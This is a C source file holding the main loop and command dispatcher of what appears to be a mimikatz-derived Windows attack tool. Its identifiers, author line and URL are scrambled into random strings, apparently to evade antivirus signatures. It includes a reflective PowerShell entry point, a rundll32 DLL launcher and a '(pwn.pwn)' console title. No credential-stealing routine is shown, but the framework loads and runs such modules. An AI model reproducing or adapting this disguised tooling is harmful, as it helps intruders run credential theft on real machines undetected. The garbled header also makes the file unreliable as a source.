/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "miAquvwg.h"

const KUHL_M * miAquvwg_modules[] = {
	&kcpdclqlmisc,
#if defined(NET_MODULE)
#endif
	&kcpdclqlrpc,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#if !defined(_POWERKATZ)
	size_t len;
	wchar_t input[0xffff];
#endif
	miAquvwg_begin();
	for(i = AHFIEEIO_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
	{
		kprintf(L"\n" AHFIEEIO L"(" AHFIEEIO_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = miAquvwg_dispatchCommand(argv[i]);
	}
#if !defined(_POWERKATZ)
	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
	{
		kprintf(L"\n" AHFIEEIO L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = miAquvwg_dispatchCommand(input);
		}
	}
#endif
	miAquvwg_end(status);
	return STATUS_SUCCESS;
}

void miAquvwg_begin()
{
	ydeuclqloutput_init();
#if !defined(_POWERKATZ)
	SetConsoleTitle(AHFIEEIO L" " AHFIEEIO_VERSION L" " AHFIEEIO_ARCH L" (pwn.pwn)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	kprintf(L"\n"
		L"  Misc-Katz Start - type misc:: for module options/\n");
	miAquvwg_initOrClean(TRUE);
}

void miAquvwg_end(NTSTATUS status)
{
	miAquvwg_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	ydeuclqloutput_clean();
#if !defined(_WINDLL)
	if(status == STATUS_THREAD_IS_TERMINATING)
		ExitThread(STATUS_SUCCESS);
	else ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	miAquvwg_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS miAquvwg_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&AHFIEEIO_NT_MAJOR_VERSION, &AHFIEEIO_NT_MINOR_VERSION, &AHFIEEIO_NT_BUILD_NUMBER);
		AHFIEEIO_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		ydeuclqlasn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(miAquvwg_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (miAquvwg_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), miAquvwg_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		ydeuclqlasn1_term();
		CoUninitialize();
		ydeuclqloutput_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS miAquvwg_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = ydeuclqlfile_fullPath(input))
	{
		switch(full[0])
		{
		case L'*':
			status = kcpdclqlrpc_do(full + 1);
			break;
		default:
			status = miAquvwg_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS miAquvwg_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(miAquvwg_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, miAquvwg_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < miAquvwg_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, miAquvwg_modules[indexModule]->commands[indexCommand].command) == 0)
							status = miAquvwg_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(miAquvwg_modules); indexModule++)
			{
				kprintf(L"\n%16s", miAquvwg_modules[indexModule]->shortName);
				if(miAquvwg_modules[indexModule]->fullName)
					kprintf(L"  -  %s", miAquvwg_modules[indexModule]->fullName);
				if(miAquvwg_modules[indexModule]->description)
					kprintf(L"  [%s]", miAquvwg_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, miAquvwg_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", miAquvwg_modules[indexModule]->shortName);
			if(miAquvwg_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", miAquvwg_modules[indexModule]->fullName);
			if(miAquvwg_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", miAquvwg_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < miAquvwg_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", miAquvwg_modules[indexModule]->commands[indexCommand].command);
				if(miAquvwg_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", miAquvwg_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_miAquvwg(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK miAquvwg_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;

	AllocConsole();
#pragma warning(push)
#pragma warning(disable:4996)
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	freopen("CONIN$", "r", stdin);
#pragma warning(pop)
	if(lpszCmdLine && lstrlenW(lpszCmdLine))
	{
		if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
		{
			wmain(argc, argv);
			LocalFree(argv);
		}
	}
	else wmain(0, NULL);
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;